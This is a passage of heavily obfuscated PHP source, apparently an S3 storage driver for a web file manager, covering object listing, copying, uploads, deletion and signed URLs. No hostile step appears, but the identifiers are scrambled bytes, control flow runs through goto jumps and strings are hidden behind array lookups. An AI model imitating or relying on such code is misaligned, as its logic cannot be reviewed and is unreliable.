(empty($B¢Ó‘ö¢š¦)) { return array(); } $Bâé¾£„®® = array(); goto EŒÄ¿Å¸‰Ø; A–ãô ³¹Â: } public function slicePath($C‘ÄËæô…Î) { $Bˆõ­ù“Ò =& $_SERVER[Ìó]; $F‘Ÿ‚áâø± = explode($Bˆõ­ù“Ò[8], trim($C‘ÄËæô…Î, $Bˆõ­ù“Ò[8])); $fÁè‰œÕ£ì = 0; do { ++$fÁè‰œÕ£ì; $D…¥õ¨ó˜[] = implode($Bˆõ­ù“Ò[8], array_slice($F‘Ÿ‚áâø±, 0, $fÁè‰œÕ£ì)) . $Bˆõ­ù“Ò[8]; } while ($fÁè‰œÕ£ì < count($F‘Ÿ‚áâø±)); $D…¥õ¨ó˜[count($F‘Ÿ‚áâø±) - 1] = $C‘ÄËæô…Î; return $D…¥õ¨ó˜; } public function getHost() { $Cœ£‘¿İ„„ =& $_SERVER[Ìó]; $A©¼Ó†ñ¤¸ = parse_url(trim($this->domain, $Cœ£‘¿İ„„[8])); $BŠò¿îÖ§† = isset($A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[164]]) ? $A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[164]] : http_type(); $B°˜å›¸Ù” = isset($A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[165]]) ? $A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[165]] : $A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[75]]; if (isset($A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[166]])) { $B°˜å›¸Ù” .= $Cœ£‘¿İ„„[4] . $A©¼Ó†ñ¤¸[$Cœ£‘¿İ„„[166]]; } return $BŠò¿îÖ§† . $Cœ£‘¿İ„„[167] . $B°˜å›¸Ù”; } public function pathEncode($dª«³®ê†õ) { $b¨‰« œçª =& $_SERVER[Ìó]; return str_replace($b¨‰« œçª[168], $b¨‰« œçª[8], rawurlencode($dª«³®ê†õ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($bç–“¨ßæö) { set_timeout(); require_once SDK_DIR . $_SERVER[Ìó][169]; parent::__construct(); $this->_init($bç–“¨ßæö); } public function _init($Fœâ¾ğ¾Å›) { foreach ($Fœâ¾ğ¾Å› as $dË„ÕäÊ–ê => $A¹Í•´ØÆ) { if (isset($this->{$dË„ÕäÊ–ê})) { $this->{$dË„ÕäÊ–ê} = $A¹Í•´ØÆ; } } $this->endpoint = $Fœâ¾ğ¾Å›[$_SERVER[Ìó][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($e‰ ‡ªÎ†· = "\166\64") { $this->signVer = $e‰ ‡ªÎ†·; $this->client->setSignatureVersion($e‰ ‡ªÎ†·); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto c‹êãÓ…¶ê; A‘ÇÙö®éæ: if ($BÅğ‹Š ñ[$b³Ú×ñÕÏ[171]] != $b³Ú×ñÕÏ[172] || $BÅğ‹Š ñ[$b³Ú×ñÕÏ[173]] != $b³Ú×ñÕÏ[172]) { return !1; } $f§È½ëÖ­ = array_map($b³Ú×ñÕÏ[174], $BÅğ‹Š ñ[$b³Ú×ñÕÏ[175]]); if (!is_array($f§È½ëÖ­)) { $f§È½ëÖ­ = array(); } goto C­ŒÑØÔŠ; c‹êãÓ…¶ê: $b³Ú×ñÕÏ =& $_SERVER[Ìó]; $BÅğ‹Š ñ = $this->getBucketCors(); if (!$BÅğ‹Š ñ || !is_array($BÅğ‹Š ñ)) { return !1; } goto A‘ÇÙö®éæ; C­ŒÑØÔŠ: $F­ŠÀäÆ¨ = array($b³Ú×ñÕÏ[176], $b³Ú×ñÕÏ[177], $b³Ú×ñÕÏ[178], $b³Ú×ñÕÏ[179], $b³Ú×ñÕÏ[180]); $c¦¥½¹å›Ç = array_diff($F­ŠÀäÆ¨, $f§È½ëÖ­); return empty($c¦¥½¹å›Ç); goto c¬‡åóÌÜä; c¬‡åóÌÜä: } public function mkfile($E—Ì¼Ì¯ôá, $Dä˜‰Œ×‹ = '', $a«‚¦¦Üª  = REPEAT_RENAME) { $d„ˆãóÄˆ = $this->setContent($E—Ì¼Ì¯ôá, $Dä˜‰Œ×‹); if ($d„ˆãóÄˆ !== !1) { return $this->getPathOuter($E—Ì¼Ì¯ôá); } return !1; } public function mkdir($d¸àà¡Ì…Ì, $FÛéÏÚíó« = REPEAT_SKIP) { if (empty($d¸àà¡Ì…Ì)) { return !1; } if ($this->_isFolder($d¸àà¡Ì…Ì)) { return $this->getPathOuter($d¸àà¡Ì…Ì); } $E±ÃãğÇ = $this->setContent($d¸àà¡Ì…Ì, $_SERVER[Ìó][33], !0); if ($E±ÃãğÇ !== !1) { return $this->getPathOuter($d¸àà¡Ì…Ì); } return !1; } public function copyFile($cÕÈßŒì´ï, $aˆ»·®íŸİ, $FïÕ†‹Åå¶ = array()) { $c¸‹‚Û‡Ç =& $_SERVER[Ìó]; $FÉßê¸Ë¥ô = $this->objectMeta($cÕÈßŒì´ï); if (!$FÉßê¸Ë¥ô) { return !1; } if ($FÉßê¸Ë¥ô[$c¸‹‚Û‡Ç[77]] <= 1024 * 1024 * 200) { $e‚ˆë®Ğ  = $this->client->copyObject($this->bucket, $cÕÈßŒì´ï, $this->bucket, $aˆ»·®íŸİ, $c¸‹‚Û‡Ç[181], $FïÕ†‹Åå¶); } else { $e‚ˆë®Ğ  = $this->client->multiCopyObject($this->bucket, $cÕÈßŒì´ï, $this->bucket, $aˆ»·®íŸİ, $FïÕ†‹Åå¶); } $e‚ˆë®Ğ  = $e‚ˆë®Ğ  ? $this->getPathOuter($aˆ»·®íŸİ) : !1; return $e‚ˆë®Ğ ; } public function moveFile($Eš¡‹†¨â, $Fï‚¯”›¤Ş) { if ($this->copyFile($Eš¡‹†¨â, $Fï‚¯”›¤Ş)) { $this->delFile($Eš¡‹†¨â); return $this->getPathOuter($Fï‚¯”›¤Ş); } return !1; } public function delFile($BªØøƒ‹ÎŠ) { return $this->client->deleteObject($this->bucket, $BªØøƒ‹ÎŠ); } public function delFolder($E´¦‚…„¦) { goto DƒÔ¸×ñò; dµ˜Ñ°µ: return $b¼µÙ¥¡ === $b¬“ †Ó¿É ? !0 : !1; goto CŒ¢Ì†¹½; aŠ¿ùÆÑ¯¨: $b¼µÙ¥¡ = $b¬“ †Ó¿É = 0; $b­˜´­ÅÂˆ = array_chunk(array_keys($C–ÃƒãŒÊÕ), 1000); foreach ($b­˜´­ÅÂˆ as $cˆŸ¾²èã) { $b¼µÙ¥¡++; $b¬“ †Ó¿É += (int) $this->client->deleteObjects($this->bucket, $cˆŸ¾²èã); } goto dµ˜Ñ°µ; DƒÔ¸×ñò: $Bôµ‘‘¢ê =& $_SERVER[Ìó]; $C–ÃƒãŒÊÕ = $this->listObjs($E´¦‚…„¦); if (!$C–ÃƒãŒÊÕ) { $E´¦‚…„¦ = trim($E´¦‚…„¦, $Bôµ‘‘¢ê[8]); if (!empty($E´¦‚…„¦)) { $E´¦‚…„¦ .= $Bôµ‘‘¢ê[8]; } return $this->delFile($E´¦‚…„¦); } goto aŠ¿ùÆÑ¯¨; CŒ¢Ì†¹½: } public function rename($CÏ†§ó¹¶, $a¦–Œ Â§) { return $this->renameObject($CÏ†§ó¹¶, $a¦–Œ Â§); } public function listPath($E„ŸÛšå—, $Bº¾Îº­öĞ = false) { $aÓ¤¦«Ì· =& $_SERVER[Ìó]; $eÒ„®®ƒò½ = $this->listObjs($E„ŸÛšå—, null, null, $aÓ¤¦«Ì·[8]); $fòù·Ú Û  = array($aÓ¤¦«Ì·[74] => array(), $aÓ¤¦«Ì·[73] => array()); foreach ($eÒ„®®ƒò½ as $BÆ£“Š … => $D—õ””Š³) { if ($BÆ£“Š … == $aÓ¤¦«Ì·[8]) { continue; } if (isset($D—õ””Š³[$aÓ¤¦«Ì·[182]])) { $fòù·Ú Û [$aÓ¤¦«Ì·[74]][] = $this->folderInfo($D—õ””Š³[$aÓ¤¦«Ì·[182]], $Bº¾Îº­öĞ); } else { if (substr($D—õ””Š³[$aÓ¤¦«Ì·[28]], -1) == $aÓ¤¦«Ì·[8]) { continue; } $fòù·Ú Û [$aÓ¤¦«Ì·[73]][] = $this->fileInfo($D—õ””Š³[$aÓ¤¦«Ì·[28]], $Bº¾Îº­öĞ, $D—õ””Š³); } } return $fòù·Ú Û ; } private function fileInfo($aùŞƒÊ²Úµ, $bè† ¥›¦ = false, $DÇëöİ™ÕÛ = array()) { goto CèˆåÛÅÓ; Fäôåï³Ğ: if (empty($DÇëöİ™ÕÛ)) { $DÇëöİ™ÕÛ = $this->objectMeta($aùŞƒÊ²Úµ); if (!$DÇëöİ™ÕÛ) { return $D£¤Š„ƒ˜Æ; } } if (isset($DÇëöİ™ÕÛ[$Bƒ¹©Òè×§[186]])) { $D£¤Š„ƒ˜Æ[$Bƒ¹©Òè×§[106]] = $DÇëöİ™ÕÛ[$Bƒ¹©Òè×§[186]]; } if (isset($DÇëöİ™ÕÛ[$Bƒ¹©Òè×§[77]])) { $D£¤Š„ƒ˜Æ[$Bƒ¹©Òè×§[77]] = $DÇëöİ™ÕÛ[$Bƒ¹©Òè×§[77]]; } goto Dè”æöÀƒ; CèˆåÛÅÓ: $Bƒ¹©Òè×§ =& $_SERVER[Ìó]; if ($bè† ¥›¦) { return array($Bƒ¹©Òè×§[28] => $this->pathThis($aùŞƒÊ²Úµ), $Bƒ¹©Òè×§[75] => $this->getPathOuter($aùŞƒÊ²Úµ), $Bƒ¹©Òè×§[29] => $Bƒ¹©Òè×§[163], $Bƒ¹©Òè×§[156] => $this->ext($aùŞƒÊ²Úµ), $Bƒ¹©Òè×§[77] => isset($DÇëöİ™ÕÛ[$Bƒ¹©Òè×§[77]]) ? $DÇëöİ™ÕÛ[$Bƒ¹©Òè×§[77]] : 0, $Bƒ¹©Òè×§[183] => 0, $Bƒ¹©Òè×§[106] => 0, $Bƒ¹©Òè×§[184] => !0, $Bƒ¹©Òè×§[185] => !0); } $D£¤Š„ƒ˜Æ = array($Bƒ¹©Òè×§[28] => $this->pathThis($aùŞƒÊ²Úµ), $Bƒ¹©Òè×§[75] => $this->getPathOuter($aùŞƒÊ²Úµ), $Bƒ¹©Òè×§[29] => $Bƒ¹©Òè×§[163], $Bƒ¹©Òè×§[183] => 0, $Bƒ¹©Òè×§[106] => 0, $Bƒ¹©Òè×§[77] => 0, $Bƒ¹©Òè×§[156] => $this->ext($aùŞƒÊ²Úµ), $Bƒ¹©Òè×§[184] => !0, $Bƒ¹©Òè×§[185] => !0); goto Fäôåï³Ğ; Dè”æöÀƒ: return $D£¤Š„ƒ˜Æ; goto BñÆ±½ÔÑ—; BñÆ±½ÔÑ—: } private function folderInfo($EìÖÊ„©Çõ, $C¦å“Æ—“† = false) { goto cÆàÔ…§’Î; cÆàÔ…§’Î: $E–ùÊÉ„ŠÊ =& $_SERVER[Ìó]; if ($C¦å“Æ—“†) { return array($E–ùÊÉ„ŠÊ[28] => $this->pathThis($EìÖÊ„©Çõ), $E–ùÊÉ„ŠÊ[75] => $this->getPathOuter($E–ùÊÉ„ŠÊ[8] . $EìÖÊ„©Çõ), $E–ùÊÉ„ŠÊ[29] => $E–ùÊÉ„ŠÊ[76], $E–ùÊÉ„ŠÊ[184] => !0, $E–ùÊÉ„ŠÊ[185] => !0); } $dÛï‰¦°„— = array($E–ùÊÉ„ŠÊ[28] => $this->pathThis($EìÖÊ„©Çõ), $E–ùÊÉ„ŠÊ[75] => $this->getPathOuter($E–ùÊÉ„ŠÊ[8] . $EìÖÊ„©Çõ), $E–ùÊÉ„ŠÊ[29] => $E–ùÊÉ„ŠÊ[76], $E–ùÊÉ„ŠÊ[183] => 0, $E–ùÊÉ„ŠÊ[106] => 0, $E–ùÊÉ„ŠÊ[184] => !0, $E–ùÊÉ„ŠÊ[185] => !0); goto dò«‰¬ÑÁ“; b„èô†Å’¤: if (isset($Bµ–Å¡–àÎ[$E–ùÊÉ„ŠÊ[186]])) { $dÛï‰¦°„—[$E–ùÊÉ„ŠÊ[183]] = $Bµ–Å¡–àÎ[$E–ùÊÉ„ŠÊ[186]]; } return $dÛï‰¦°„—; goto FÃÆÜì«¶; dò«‰¬ÑÁ“: if ($EìÖÊ„©Çõ == $E–ùÊÉ„ŠÊ[33]) { return $dÛï‰¦°„—; } $EìÖÊ„©Çõ = trim($EìÖÊ„©Çõ, $E–ùÊÉ„ŠÊ[8]) . $E–ùÊÉ„ŠÊ[8]; $Bµ–Å¡–àÎ = $this->objectMeta($EìÖÊ„©Çõ); goto b„èô†Å’¤; FÃÆÜì«¶: } public function listObjs($E“¦Çˆ‹Ò, $FËåÁ£Ê ‰ = null, $A®ç‰Ñ²Éİ = null, $F†ŒÕ…†ï± = null) { $f‹Õï†îÛ =& $_SERVER[Ìó]; $E“¦Çˆ‹Ò = trim($E“¦Çˆ‹Ò, $f‹Õï†îÛ[8]); $f£—ËÓ®à = empty($E“¦Çˆ‹Ò) ? $f‹Õï†îÛ[33] : $E“¦Çˆ‹Ò . $f‹Õï†îÛ[8]; return $this->client->getBucket($this->bucket, $f£—ËÓ®à, $FËåÁ£Ê ‰, $A®ç‰Ñ²Éİ, $F†ŒÕ…†ï±, !0); } public function has($dØÍ·ˆê¯­, $aİŸí†ÊÕ = false, $bÄ¯ó¸‹Ü = true) { goto d Ø·à’éÃ; d Ø·à’éÃ: $Aˆé‘“í“ =& $_SERVER[Ìó]; $d¹ÉĞ¤˜ª = 0; $a½·øÖŸ©¼ = 0; goto dÃ¥Øö†; dÃ¥Øö†: $EĞ„É•›ÛÂ = $this->listObjs($dØÍ·ˆê¯­, null, null, $Aˆé‘“í“[8]); $EĞ„É•›ÛÂ = is_array($EĞ„É•›ÛÂ) ? $EĞ„É•›ÛÂ : array(); foreach ($EĞ„É•›ÛÂ as $eóÅ®¤ŞçÏ) { if (isset($eóÅ®¤ŞçÏ[$Aˆé‘“í“[28]]) && substr($eóÅ®¤ŞçÏ[$Aˆé‘“í“[28]], -1) != $Aˆé‘“í“[8]) { if (!$aİŸí†ÊÕ && $bÄ¯ó¸‹Ü) { return !0; } $d¹ÉĞ¤˜ª++; } else { if (isset($eóÅ®¤ŞçÏ[$Aˆé‘“í“[182]])) { if (!$aİŸí†ÊÕ && !$bÄ¯ó¸‹Ü) { return !1; } $a½·øÖŸ©¼++; } } } goto C•÷ªÔ¥‚†; C•÷ªÔ¥‚†: if ($aİŸí†ÊÕ) { return array($Aˆé‘“í“[187] => $d¹ÉĞ¤˜ª, $Aˆé‘“í“[188] => $a½·øÖŸ©¼); } return !1; goto d¯†ƒ¨÷õ‚; d¯†ƒ¨÷õ‚: } public function listAll($fµ¬ˆ‹è¤›) { $f˜ÌˆâŸ©´ =& $_SERVER[Ìó]; $EÄò¡¬ñ—† = $this->listObjs($fµ¬ˆ‹è¤›); $F·ÙáÆè„Â = $DùÈÄ”ØÑ = array(); foreach ($EÄò¡¬ñ—† as $eï©ĞæëÊ£ => $e¬ñ³Ç‹¯‹) { $F·ÙáÆè„Â[] = $e¬ñ³Ç‹¯‹[$f˜ÌˆâŸ©´[28]]; $DùÈÄ”ØÑ[$eï©ĞæëÊ£] = $e¬ñ³Ç‹¯‹[$f˜ÌˆâŸ©´[77]]; } return $this->listAllFiles($fµ¬ˆ‹è¤›, $F·ÙáÆè„Â, $DùÈÄ”ØÑ); } public function canRead($FïË‹Æß) { $DŠï­Îã =& $_SERVER[Ìó]; $eÏİƒÍîµ = $this->client->getAccessControlPolicy($this->bucket, $FïË‹Æß); if (!$eÏİƒÍîµ) { return !1; } return in_array($eÏİƒÍîµ, array($DŠï­Îã[189], $DŠï­Îã[190], $DŠï­Îã[191])) ? !0 : !1; } public function canWrite($fÃ¸ÖªØ¦Š) { $aŠ¨Ÿ²×Òâ =& $_SERVER[Ìó]; $DƒÅî—ˆè• = $this->client->getAccessControlPolicy($this->bucket, $fÃ¸ÖªØ¦Š); if (!$DƒÅî—ˆè•) { return !1; } return in_array($DƒÅî—ˆè•, array($aŠ¨Ÿ²×Òâ[189], $aŠ¨Ÿ²×Òâ[190])) ? !0 : !1; } public function getContent($AœìïŸ£Ì) { return $this->client->getObject($this->bucket, $AœìïŸ£Ì); } public function setContent($e¿Ãã‡¸‡, $d¹‡Ò‹‚Ë˜ = '', $AœŸ¹Èß › = false) { goto dŠ†øºäİ; dŠ†øºäİ: $d¨æÏ¡£‘ =& $_SERVER[Ìó]; $e¿Ãã‡¸‡ = $AœŸ¹Èß › ? trim($e¿Ãã‡¸‡, $d¨æÏ¡£‘[8]) . $d¨æÏ¡£‘[8] : $e¿Ãã‡¸‡; $Aã‹Ø‘åî = get_file_mime(get_path_ext($e¿Ãã‡¸‡)); goto e™Šã“°æ; e™Šã“°æ: $fœ›’—Û· = $this->client->putObject($d¹‡Ò‹‚Ë˜, $this->bucket, $e¿Ãã‡¸‡, $d¨æÏ¡£‘[181], array(), $Aã‹Ø‘åî); if (!$fœ›’—Û·) { return !1; } if ($AœŸ¹Èß ›) { return !0; } goto CœÛì¾’×; CœÛì¾’×: $fœ›’—Û· = $this->copyFile($e¿Ãã‡¸‡, $e¿Ãã‡¸‡, array($d¨æÏ¡£‘[192] => $fœ›’—Û·[$d¨æÏ¡£‘[193]])); return $fœ›’—Û· ? !0 : !1; goto dŞÃ°˜ó…—; dŞÃ°˜ó…—: } public function fileSubstr($D•¢Åõ²Ù‘, $Aœ¿‰«¹ÏŞ, $føäèæÆ¦) { $c©šà‘‚—× = $Aœ¿‰«¹ÏŞ + $føäèæÆ¦ - 1; return $this->client->getObject($this->bucket, $D•¢Åõ²Ù‘, array($_SERVER[Ìó][194] => "\142\171\164\x65\x73\75{$Aœ¿‰«¹ÏŞ}\55{$c©šà‘‚—×}")); } public function upload($eÅÔ™ß™¡ƒ, $bÎƒƒâÕÑì, $fˆàöÁë„ = false, $c…Ì‰Ø¸Ş· = REPEAT_REPLACE) { $F‡¦ô¦Š =& $_SERVER[Ìó]; $F¾¹µ¡°´î = array($F‡¦ô¦Š[192] => @md5_file($bÎƒƒâÕÑì)); $dõ¶™Ã‡›Ê = array($F‡¦ô¦Š[195] => get_file_mime(get_path_ext($eÅÔ™ß™¡ƒ))); if (IO::size($bÎƒƒâÕÑì) <= 1024 * 1024 * 200) { $A¸Ô…éÍ‘ç = $this->client->putObjectFile($bÎƒƒâÕÑì, $this->bucket, $eÅÔ™ß™¡ƒ, $F‡¦ô¦Š[181], $F¾¹µ¡°´î, $dõ¶™Ã‡›Ê); return !empty($A¸Ô…éÍ‘ç) ? $this->getPathOuter($eÅÔ™ß™¡ƒ) : !1; } $F„ˆäÕ…Õƒ = $this->client->multiUploadObject($bÎƒƒâÕÑì, $this->bucket, trim($eÅÔ™ß™¡ƒ, $F‡¦ô¦Š[8]), $F¾¹µ¡°´î, $dõ¶™Ã‡›Ê); return $F„ˆäÕ…Õƒ ? $this->getPathOuter($eÅÔ™ß™¡ƒ) : !1; } public function download($aœ¾Æ‹åéÓ, $Dß»ô¨ä†Á) { if (!@is_dir($this->pathFather($Dß»ô¨ä†Á)) && !IO::mkdir($this->pathFather($Dß»ô¨ä†Á))) { return !1; } $b±¤æööÈÀ = $this->client->getObject($this->bucket, $aœ¾Æ‹åéÓ, array(), $Dß»ô¨ä†Á); return $b±¤æööÈÀ !== !1 ? $Dß»ô¨ä†Á : !1; } public function link($B×†•µËÙ÷, $DßÊÒö´Ğ = array()) { $cƒ„Ö£ÒË =& $_SERVER[Ìó]; if ($this->signVer == $cƒ„Ö£ÒË[196]) { return $this->client->getAuthenticatedURL($this->bucket, $B×†•µËÙ÷, 3600 * 12, $DßÊÒö´Ğ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B×†•µËÙ÷, $cƒ„Ö£ÒË[8]), 3600 * 12, $this->region, array(), !0, $DßÊÒö´Ğ); } public function fileOut($EÎÅ‰Ìª, $FÑØäµÎ÷ = false, $fñ·©šİÉÆ = false, $FÎ’Ğ™Â‹‡ = '') { goto Dª³ñ‚öš„; A¢’ÒÓˆ: $bĞÄ´‚Ì¥– = $this->link($EÎÅ‰Ìª, $Eù¹®ÍŸ¿°); $this->fileOutLink($bĞÄ´‚Ì¥–); goto FâÔ˜ºµ¨ó; Dª³ñ‚öš„: $Fƒ¦Ôë„ÀÍ =& $_SERVER[Ìó]; if (!$fñ·©šİÉÆ) { $fñ·©šİÉÆ = $this->pathThis($EÎÅ‰Ìª); } $dŞôá”áÜ¢ = get_file_mime(get_path_ext($fñ·©šİÉÆ)); goto Eà¿¶–öï£; Eà¿¶–öï£: if ($dŞôá”áÜ¢ == $Fƒ¦Ôë„ÀÍ[197]) { return parent::fileOut($EÎÅ‰Ìª, $FÑØäµÎ÷, $fñ·©šİÉÆ, $FÎ’Ğ™Â‹‡); } $FÑØäµÎ÷ = $FÑØäµÎ÷ ? $Fƒ¦Ôë„ÀÍ[198] : $Fƒ¦Ôë„ÀÍ[199]; $Eù¹®ÍŸ¿° = array($Fƒ¦Ôë„ÀÍ[200] => $FÑØäµÎ÷ . $Fƒ¦Ôë„ÀÍ[201] . rawurlencode($fñ·©šİÉÆ), $Fƒ¦Ôë„ÀÍ[202] => $dŞôá”áÜ¢); goto A¢’ÒÓˆ; FâÔ˜ºµ¨ó: } public function fileOutServer($EŒÉ‘‚°ˆğ, $C†áË’­ªğ = false, $d†ÊŞôÙÚŒ = false, $CÄ¼Ãì–Ÿ§ = '') { parent::fileOut($EŒÉ‘‚°ˆğ, $C†áË’­ªğ, $d†ÊŞôÙÚŒ, $CÄ¼Ãì–Ÿ§); } public function fileOutImage($Cœ®Ç¹·êŠ, $aåˆ§‚ñ = 250) { $d½Ş¤İ§Ü = $this->link($Cœ®Ç¹·êŠ); $this->fileOutLink($d½Ş¤İ§Ü); } public function fileOutImageServer($F˜ïÜ’ÃõÙ, $cÊ½¡œÈù = 250) { parent::fileOutImage($F˜ïÜ’ÃõÙ, $cÊ½¡œÈù); } public function hashMd5($cà÷‘«÷…ƒ, $cÃîÚÙÆ¹ = '') { $A¸¦·Â Üç =& $_SERVER[Ìó]; $AÃ»Ÿ‡é  = $this->objectMeta($cà÷‘«÷…ƒ); if (!$AÃ»Ÿ‡é ) { return !1; } $cÃîÚÙÆ¹ = $cÃîÚÙÆ¹ ? $cÃîÚÙÆ¹ : _get($AÃ»Ÿ‡é , $A¸¦·Â Üç[203]); $cÃîÚÙÆ¹ = $cÃîÚÙÆ¹ ? $cÃîÚÙÆ¹ : _get($AÃ»Ÿ‡é , $A¸¦·Â Üç[193], $A¸¦·Â Üç[33]); return $cÃîÚÙÆ¹; } public function uploadFormData($eñ‘ƒÌ“ƒµ, $EŠ‚Õ»è‰£ = 3600) { $fŞ‰ó½°Ö¤ =& $_SERVER[Ìó]; $CâŠòÖÜ‘ = $this->pathFather($eñ‘ƒÌ“ƒµ); $D«ÏÄÁ‘«˜ = $this->client->getHttpUploadPostParams($this->bucket, $CâŠòÖÜ‘, $fŞ‰ó½°Ö¤[181], $EŠ‚Õ»è‰£); return array_merge((array) $D«ÏÄÁ‘«˜, array($fŞ‰ó½°Ö¤[165] => $this->getHost())); } public function multiUploadFormData($BíÁİÁŒà, $fŞøóøÕŠ = 3600) { $C˜¯É©â‡® =& $_SERVER[Ìó]; $Eê’ùŞäè = gmdate($C˜¯É©â‡®[204]); $Cåéß–ÈÇ» = array(); $dÉë…óöç = $this->client->getUploadId($this->bucket, $BíÁİÁŒà, $Cåéß–ÈÇ»); if (!$dÉë…óöç) { return !1; } return array($C˜¯É©â‡®[205] => $dÉë…óöç, $C˜¯É©â‡®[165] => $this->getHost() . $C˜¯É©â‡®[8] . $this->pathEncode($BíÁİÁŒà), $C˜¯É©â‡®[206] => $Eê’ùŞäè, $C˜¯É©â‡®[89] => $BíÁİÁŒà); } public function multiUploadAuthData($C«ê¼µ„Æ, $EƒÑ…ÍÅ´÷ = array()) { goto B¯ÌÎØ°; BŸ–È÷‘ƒà: $C³Ö¤æÎ = implode($Cğğ¶ë×Ö[213], $D¨œìøÎÉ); $dŒ­Ò¤Ñ„ƒ = base64_encode(hash_hmac($Cğğ¶ë×Ö[214], $C³Ö¤æÎ, $this->secret, !0)); $a’‚Ğ¢¶ŞÁ = $Cğğ¶ë×Ö[215] . $this->accessKey . $Cğğ¶ë×Ö[4] . $dŒ­Ò¤Ñ„ƒ; goto BµÌÉÅÕİ; B¯ÌÎØ°: $Cğğ¶ë×Ö =& $_SERVER[Ìó]; $dš§…ÃŠù§ = isset($EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[206]]) ? $EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[206]] : gmdate($Cğğ¶ë×Ö[204]); $AÌæÈÃ¢Õ = isset($EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[156]]) ? $EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[156]] : $Cğğ¶ë×Ö[33]; goto BåÊ˜Êö; d™ÒğÛ¦”Œ: $D¨œìøÎÉ = array($Cğğ¶ë×Ö[208], $Cğğ¶ë×Ö[33], $Cğğ¶ë×Ö[115], $Cğğ¶ë×Ö[33], "\x78\x2d\x61\155\172\x2d\x64\x61\x74\145\72{$dš§…ÃŠù§}", $Cğğ¶ë×Ö[8] . $this->bucket . $Cğğ¶ë×Ö[8] . $this->pathEncode($cãÚ”é»¯¼) . $AÌæÈÃ¢Õ); if (strpos($AÌæÈÃ¢Õ, $Cğğ¶ë×Ö[209]) === 0) { $D¨œìøÎÉ[0] = $Cğğ¶ë×Ö[210]; } if (isset($EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[211]]) && $EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[211]] == $Cğğ¶ë×Ö[212]) { $D¨œìøÎÉ[0] = $Cğğ¶ë×Ö[212]; } goto BŸ–È÷‘ƒà; BåÊ˜Êö: $cãÚ”é»¯¼ = $EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[89]]; unset($EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[89]]); if (isset($EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[207]])) { $EƒÑ…ÍÅ´÷[$Cğğ¶ë×Ö[206]] = $dš§…ÃŠù§; return $this->listUploadParts($cãÚ”é»¯¼, $EƒÑ…ÍÅ´÷); } goto d™ÒğÛ¦”Œ; BµÌÉÅÕİ: if (strpos($AÌæÈÃ¢Õ, $Cğğ¶ë×Ö[209]) === 0) { return array($Cğğ¶ë×Ö[216] => $a’‚Ğ¢¶ŞÁ, $Cğğ¶ë×Ö[206] => $dš§…ÃŠù§); } return $a’‚Ğ¢¶ŞÁ; goto Aæõ„¬âè; Aæõ„¬âè: } public function listUploadParts($f—ŠÕÇªƒ, $AºøÓÄ² = array()) { goto B–“–¤ñ; B–“–¤ñ: $E¦¶Åë¡Û =& $_SERVER[Ìó]; $fßšÀ¼¢ö = str_replace($E¦¶Åë¡Û[217], $E¦¶Åë¡Û[33], $AºøÓÄ²[$E¦¶Åë¡Û[156]]); $A‡Çìƒà’ = $this->client->listParts($this->bucket, $f—ŠÕÇªƒ, $fßšÀ¼¢ö); goto e·–İ¬ƒ; Eê¨ÏÆ“ƒ¸: $BÚãÌŒ‚…Ô = $this->multiUploadAuthData($f—ŠÕÇªƒ, $AºøÓÄ²); if (empty($BÚãÌŒ‚…Ô)) { return !1; } return array($E¦¶Åë¡Û[216] => $BÚãÌŒ‚…Ô, $E¦¶Åë¡Û[206] => $AºøÓÄ²[$E¦¶Åë¡Û[206]], $E¦¶Åë¡Û[218] => $A‡Çìƒà’); goto F¦ñ’ÎÓê°; e·–İ¬ƒ: if (!$A‡Çìƒà’) { return !1; } unset($AºøÓÄ²[$E¦¶Åë¡Û[207]], $AºøÓÄ²[$E¦¶Åë¡Û[211]]); $AºøÓÄ²[$E¦¶Åë¡Û[89]] = $f—ŠÕÇªƒ; goto Eê¨ÏÆ“ƒ¸; F¦ñ’ÎÓê°: } public function getHost() { return parent::getHost() . $_SERVER[Ìó][8] . $this->bucket; } public function size($bó´Ìİñ) { $C†Ù§¼•§ê = $this->objectMeta($bó´Ìİñ); return $C†Ù§¼•§ê ? $C†Ù§¼•§ê[$_SERVER[Ìó][77]] : 0; } public function info($fÇÊ©„õ²â) { if ($this->isFolder($fÇÊ©„õ²â)) { return $this->folderInfo($fÇÊ©„õ²â); } else { if ($this->isFile($fÇÊ©„õ²â)) { return $this->fileInfo($fÇÊ©„õ²â); } } return !1; } public function exist($dùõ±øŠ‹) { return $this->isFile($dùõ±øŠ‹) || $this->isFolder($dùõ±øŠ‹); } public function isFile($EßÚœâöæ) { return !$this->isFolder($EßÚœâöæ) && $this->objectMeta($EßÚœâöæ); } public function isFolder($D»‡•ğå) { return $this->cacheMethod($_SERVER[Ìó][219], $D»‡•ğå); } protected function objectMeta($Bè«Ñ®Ğç×) { return $this->cacheMethod($_SERVER[Ìó][220], $Bè«Ñ®Ğç×); } protected function _objectMeta($Cë¤Œ†Ùè‚) { $D¸°Šä¦·ª =& $_SERVER[Ìó]; $Cë¤Œ†Ùè‚ = rtrim($Cë¤Œ†Ùè‚, $D¸°Šä¦·ª[8]); try { $b‘†’òÛ› = $this->client->getObjectInfo($this->bucket, $Cë¤Œ†Ùè‚); if 